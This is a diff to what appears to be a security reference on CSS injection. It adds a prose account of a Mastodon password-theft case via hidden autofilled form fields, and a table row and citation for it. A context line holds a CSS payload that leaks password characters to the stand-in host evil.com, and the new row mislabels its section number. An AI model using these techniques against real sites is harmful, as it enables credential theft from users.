@@ -260,6 +260,12 @@ CSS capabilities that identify users, track behavior, and fingerprint environmen
 | **Input value tracking** | `input[type="password"][value$="a"]{background:url(https://evil.com/?last=a)}` fires a request each time the last character changes, revealing password characters as typed | **Critical limitation**: only works if JavaScript dynamically updates the `value` attribute to reflect typed content — native browser behavior does not update the DOM attribute on keypress |
 | **React/Vue controlled component keylogging** | React's controlled inputs (`value={state}`) update the DOM `value` attribute on every keystroke via virtual DOM reconciliation, enabling CSS attribute selectors to detect each character | React/Vue/Angular app with controlled input components; CSS injection |
 
+### §6-4. CSS-Assisted Form Spoofing
+
+| Subtype | Mechanism | Key Condition |
+|---|---|---|
+| **Form spoofing via CSS class reuse (Mastodon)** | On the Infosec Mastodon instance, an HTML filter bypass in the `title` attribute allowed injection of hidden `<input>` fields. Rather than CSS attribute selector exfiltration, the attack reused existing Mastodon CSS classes (e.g., `react-toggle-track-check` with `opacity:0`) to visually conceal injected username and password fields — requiring no inline CSS and no CSP bypass. Chrome's password autofill automatically populated the hidden fields without user interaction. A spoofed toolbar with legitimate-looking buttons surrounded the invisible inputs; clicking any button submitted the form with captured credentials to an attacker-controlled server via HTTP POST. Demonstrates that existing CSS classes can serve as concealment primitives for form-spoofing attacks, extending CSS injection impact beyond data exfiltration | HTML injection possible (even limited); application has CSS classes producing `opacity:0` or equivalent concealment; browser autofill enabled; no `form-action` CSP directive |
+
 ---
 
 ## §7. Detection Evasion via CSS (Email Context)
@@ -373,6 +379,7 @@ CSS-only techniques that leak information through indirect channels — timing, 
 | §8-2 (PRSSI in Keycloak) | Keycloak Issue #18032 | Relative CSS link paths enable PRSSI; CSS injection via RPO on authentication pages |
 | §1 (Blind CSS exfiltration) | PortSwigger Blind CSS Exfiltration Research (2024) | `:has()` selector enables blind exfiltration of unknown pages; all ASCII data extractable |
 | §7-1 + §7-2 (Email text salting) | Cisco Talos Research (2024–2025) | Hidden text salting surge in phishing campaigns; CSS-based evasion of spam filters at scale |
+| §6-3 (Form spoofing via CSS class reuse) | Infosec Mastodon Credential Theft (2022) | HTML filter bypass + existing CSS classes for concealment + browser autofill exploitation; form submission exfiltrates credentials without CSP bypass |
 
 ---
 
@@ -425,6 +432,7 @@ CSS-only techniques that leak information through indirect channels — timing, 
 - innerht.ml. "CSS: Cascading Style Scripting." https://blog.innerht.ml/cascading-style-scripting/
 - Masato Kinugawa (MKSB). "Data Exfiltration via CSS + SVG Font." https://mksben.l0.cm/2021/11/css-exfiltration-svg-font.html
 - ACM WWW 2018. "Large-Scale Analysis of Style Injection by Relative Path Overwrite." https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090
+- PortSwigger Research (Gareth Heyes). "Stealing passwords from infosec Mastodon - without bypassing CSP." https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp
 - OWASP. "Testing for CSS Injection." https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection
 - CSS-Tricks. "CSS Security Vulnerabilities." https://css-tricks.com/css-security-vulnerabilities/
 
